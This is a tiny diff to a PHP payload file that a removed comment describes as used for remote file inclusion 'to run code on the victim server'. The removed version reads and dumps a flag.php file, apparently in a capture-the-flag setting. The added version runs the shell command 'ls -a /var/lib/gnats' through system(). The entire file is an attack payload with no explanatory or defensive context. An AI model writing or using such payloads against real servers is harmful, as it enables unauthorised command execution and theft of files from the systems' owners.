@@ -1,5 +1,3 @@
 <?php
-// This file is used for rfi to run code on the victim server
-$data = file_get_contents("/var/www/html/i_wonder_whats_in_here/flag.php");
-var_dump($data)
+system('ls -a /var/lib/gnats');
 ?>
